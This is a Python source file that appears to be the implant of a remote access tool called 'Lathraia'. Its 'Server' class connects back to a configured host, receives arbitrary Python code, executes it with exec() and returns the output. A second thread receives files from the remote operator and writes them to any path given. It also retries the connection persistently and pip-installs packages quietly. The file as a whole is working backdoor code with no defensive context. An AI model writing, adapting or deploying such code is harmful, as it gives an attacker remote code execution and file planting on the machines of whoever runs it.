import os
import sys
import socket
import threading
import json
import time

from io import StringIO

from configuration import *
from constants import *
from imports import *

class Server:
    def recvall(self, conn, length):
        """ A more efficient function for receiving all data ! """
        buf = b''
        while len(buf) < length:
            data = conn.recv(length - len(buf))
            if not data:
                return data
            buf += data
        return buf

    def command_process(self, python_code, AUTOMATIC_STR_PROCESS = True):
        """ This command parses quick python code (e.g., LS dir) into actual python code for execution (e.g., ls(dir))"""
        split_command = python_code.split(' ')
        command = split_command[0]
        if command in quick_command:
            if len(split_command) > 1:
                if AUTOMATIC_STR_PROCESS:
                    return "{command}('{args}')".format(command=command, args=(",".join(split_command[1:])))
                else:
                    return '{command}({args})'.format(command=command, args=(','.join(split_command[1:])))
            else:
                return '{command}()'.format(command=command)
        else:
            return python_code

    def outexec(self, python_code):
        """ A function for remapping the standard output so that we can return the output to the client """
        stringout = StringIO()
        sys.stdout = stringout
        response = ""

        try:
            exec(self.command_process(python_code), globals())
            sys.stdout.write(" ")
            response = stringout.getvalue()
        except Exception as err:
            response = str(err)

        sys.stdout = sys.__stdout__
        return response

    def file_get(self, filename, filesize, server_path):
        try:
            """ Obtain a file with the data port connfd. """
            contents = self.recvall(self.fconnfd, filesize)

            if (not contents):
                dprint("Error receiving file!")
                return

            if (server_path == ""):
                server_path = os.getcwd() + "/" + filename

            fp = open(server_path, "wb+")
            dprint('Downloading {filename} with a size of {size}'.format(filename=filename,
            size=filesize))
            fp.write(contents)
            fp.close()
        except Exception as error:
            dprint("Error receiving file: " + str(error))

    def file_receive_thread(self):
        """ The main thread for receiving files """
        while True:
            try:
                self.fconnfd = socket.socket()
                self.fconnfd.connect((IP_ADDRESS, DATA_PORT))
                self.fconnfd.send(CALLSIGN.encode())
                
                while True:
                    # I decided to non-standardly, arbitarily package the data information like this
                    # It hardly ever matters. 

                    filename, filesize, server_path = self.fconnfd.recv(RECEIVING_CHUNK_SIZE).decode().split(':')
                    dprint("Got FILE input")
                    dprint(filename)

                    if (not filename):
                        fconnfd.close()
                        break
                    
                    self.file_get(filename, int(filesize), server_path)

            except Exception as err:
                self.fconnfd.close()
                print("File receiving error: ", err)
                time.sleep(5)


    def execute_imports(self):
        """ Execute all of the imports, so that they can be used. """
        exec(open("imports.py", "r").read())

    def command_execution_thread(self, command):
        """ This handles the execution and returning of commands issued by the client. """
        execution_response = self.outexec(command)
        # Send back the response!
        self.socketfd.send(execution_response.encode())
        return
    
    def install_deps(self):
        """ This function installs given dependencies on Python2 and Python3 - just to be safe """
        os.system("pip install {libs} --user".format(
        libs = " ".join(dependencies)
        ))

        # To be safe, let's install it under Python 3 explicitly as well.
        os.system("pip3 install {libs} --user".format(
                libs = " ".join(dependencies)
        ))

    def main_thread(self):
        while True:
            try:
                dprint("Loaded up!")
                arguments = sys.argv
                argument_count = len(arguments)

                # Create the socket connection, by initalizing it. 
                dprint("Creating sockets...")
                self.socketfd = socket.socket()

                # Bind to whatever port is configuration within the configuration file
                dprint("Connecting to client, {ip}:{port}".format(ip = IP_ADDRESS, port = PORT))
                self.socketfd.connect((IP_ADDRESS, PORT))

                dprint("Connection success!")

                dprint("Sending callsign...")
                self.socketfd.send(CALLSIGN.encode())

                dprint("Any Python function can now be remotely executed by the client!")
            except Exception as error:
                dprint("Error in main thread: " + str(error))
                time.sleep(5)
                continue

            while True:
                try:
                    # Wait, then obtain the incoming Python command.
                    command = self.socketfd.recv(RECEIVING_CHUNK_SIZE).decode()  

                    # Check if the socket broke
                    if (not command):
                        dprint("Broken socket!")
                        time.sleep(5)
                        break

                    # The reasoning behind this thread business is quite simple when told.
                    # We don't want the entire main program to lock up on some function that's waiting on us

                    # Essentially speaking, when the client disconnects, the program will restart, regardless
                    # of whether it is being held hostage by another function. It's a nice idea, but it took me some time to envision.

                    threading._start_new_thread(self.command_execution_thread, (command,))

                except socket.error as err:
                    dprint("Error in main thread, executing a command: {error}".format(error = str(err)))
                    time.sleep(5)
                    break
        


            continue 


    def start(self):
        threading._start_new_thread(self.main_thread, ())

    def __init__(self):
        """ This initalizes the Lathraia.Server.Server Class """
        threading._start_new_thread(self.file_receive_thread, ())
        self.main_thread()

        

